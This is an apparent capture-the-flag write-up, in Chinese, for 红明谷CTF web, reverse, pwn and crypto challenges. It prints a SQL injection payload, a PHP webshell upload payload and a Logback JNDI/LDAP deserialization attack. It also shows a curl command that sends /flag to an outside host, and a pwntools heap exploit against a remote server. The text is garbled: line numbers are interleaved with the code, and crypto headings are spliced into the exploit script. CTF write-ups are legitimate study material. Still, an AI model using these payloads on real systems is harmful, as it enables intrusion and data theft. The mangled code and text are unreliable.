红明⾕CTF
Web
happysql
http://eci-2ze7dlrxgodbblkyir9b.cloudeci1.ichunqiu.com/
username=aaaw2aww"||
(strcmp((select%0a*%0afrom%0af1ag),concat("ﬂag{a4398541",char(45),"2ae3",char(45)
,"4439",char(45),"a4f6",char(45),"69eafe0e9b71}"))%0ain%0a(1))#&password=*/#
writeShell
http://eci-2ze7dlrxgodbcwxp83gz.cloudeci1.ichunqiu.com/?action=upload&data=%3C?
=`cat\$IFS/!whatyouwantggggggg401.ph*`?%3E
easytp
尝试出弱⼝令123456.....
然后读ﬂag
javaweb
/login/..;/json 绕过鉴权访问/json接⼝
jackson反序列化，post Logback反序列化链进⾏JNDI注⼊
 ["ch.qos.logback.core.db.JNDIConnectionSource",
{"jndiLocation":"ldap://ip:8013/#Exploit"}]  
由于jdk版本过⾼，⽆法加载远程class，这⾥参考http://www.yulegeyu.com/2018/12/04/JN
DI-Injection-Via-LDAP-Deserialize/ 利⽤LDAP Server返回序列化数据触发反序列化。尝试
反弹shell失败，最终使⽤cc5 curl http://ip:port/ -d @/ﬂag拿到ﬂag。
Reverse
g0 
https://pan.baidu.com/s/1ey1E5pa7tevQs7-qRpwOwA
提取码：GAME
输⼊经过简单乱序后直接作为bigint的rawbytes(big endian)，经过base58编码后与预定值⽐较
Pwn
双边协议1.0 
nc 8.140.179.11 13452
获得权限后，执⾏pwn⽂件同⽬录下的"getﬂag"，并输⼊队伍token，即可获取ﬂag。
https://pan.baidu.com/s/1jPP-0fa73PMHiCh-HaKvJg
提取码：GAME
add 之后 再改个⼤size 似乎就可以溢出了
import base58
1
import string
2
3
def deb58(enc):
4
    tbl0 = '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz'
5
    tbl1 = '12Nrst6CDquvG7BefghJKLMEFHPQZabRSTUVmyzno89ApwxWXYcdkij345'
6
    trans = enc.translate(enc.maketrans(tbl1, tbl0))
7
    return base58.b58decode(trans)
8
9
if __name__ == '__main__':
10
    ret = deb58('2GVdudkYo2CBXoQii7gfpkjTc4gT')
11
    flag = ret[15:]+ret[0:5]+ret[10:15]+ret[5:10]
12
    print(flag)
13
14
from pwn import *
1
2
# s = process("./Maybe_fun_game")
3
s = remote("8.140.179.11","13452")
4
5
def parse(buf,size=8):
6
    buf = str(buf)
7
    tmp = ''
8
    tmp += p64(0x1234567812345678)
9
    tmp += p64(len(buf)+0x20+size) #c8
10
    tmp += p64(size)   #d0
11
    tmp += p64(len(buf))   #d8
12
    for i in range(size):
13
        tmp += '\x41'
14
    tmp += str(buf)
15
    return b64e(tmp)
16
17
def get(buf):
18
    return b64d(buf)[0x28:]
19
20
def add(size,buf=''):
21
s.sendlineafter("eFY0EnhWNBIxAAAAAAAAAAgAAAAAAAAACQAAAAAAAABBQUFBQUFBQUNob
2ljZSA/Pg==",parse(1))
22
s.sendlineafter("eFY0EnhWNBIvAAAAAAAAAAgAAAAAAAAABwAAAAAAAABBQUFBQUFBQVNpe
mUgPj4=",parse(size))
23
s.sendlineafter("eFY0EnhWNBIyAAAAAAAAAAgAAAAAAAAACgAAAAAAAABBQUFBQUFBQUNvb
nRlbnQgPj4=",parse(buf))
24
25
def free():
26
s.sendlineafter("eFY0EnhWNBIxAAAAAAAAAAgAAAAAAAAACQAAAAAAAABBQUFBQUFBQUNob
2ljZSA/Pg==",parse(2))
27
28
def edit(buf):
29
s.sendlineafter("eFY0EnhWNBIxAAAAAAAAAAgAAAAAAAAACQAAAAAAAABBQUFBQUFBQUNob
2ljZSA/Pg==",parse(3))
30
s.sendlineafter("eFY0EnhWNBIyAAAAAAAAAAgAAAAAAAAACgAAAAAAAABBQUFBQUFBQUNvb
nRlbnQgPj4=",parse(buf))
31
32
def show():
33
s.sendlineafter("eFY0EnhWNBIxAAAAAAAAAAgAAAAAAAAACQAAAAAAAABBQUFBQUFBQUNob
2ljZSA/Pg==",parse(4))
34
35
# raw_input(">")
36
s.sendlineafter("eFY0EnhWNBIxAAAAAAAAAAgAAAAAAAAACQAAAAAAAABBQUFBQUFBQUNob
2ljZSA/Pg==",parse(1))
37
s.sendlineafter("eFY0EnhWNBIvAAAAAAAAAAgAAAAAAAAABwAAAAAAAABBQUFBQUFBQVNpe
mUgPj4=",parse(0x10,0x300))
38
s.sendlineafter("eFY0EnhWNBIyAAAAAAAAAAgAAAAAAAAACgAAAAAAAABBQUFBQUFBQUNvb
nRlbnQgPj4=",parse('BBBBBBBBBBB'))
39
add(0x60,'\n')
40
show()
41
s.recvline()
42
tmp = get(s.recvline()).ljust(8,'\x00')
43
tmp = u64(tmp)
44
libc = tmp-0x3c4b0a
45
success(hex(libc))
46
Crypto
RSA Attack
直接开⽴⽅就完事了。。。
EasyCRT
s.sendlineafter("eFY0EnhWNBIxAAAAAAAAAAgAAAAAAAAACQAAAAAAAABBQUFBQUFBQUNob
2ljZSA/Pg==",parse(1))
47
s.sendlineafter("eFY0EnhWNBIvAAAAAAAAAAgAAAAAAAAABwAAAAAAAABBQUFBQUFBQVNpe
mUgPj4=",parse('A'*0x60,0x60))
48
49
# gdb.attach(s,"b *$rebase(0xbc1)\nc")
50
51
add(0x60,p64(libc+0x3c4aed))
52
add(0x60,p64(libc+0x3c4aed))
53
add(0x60,p64(libc+0x3c4aed))
54
one = libc+0xf0364
55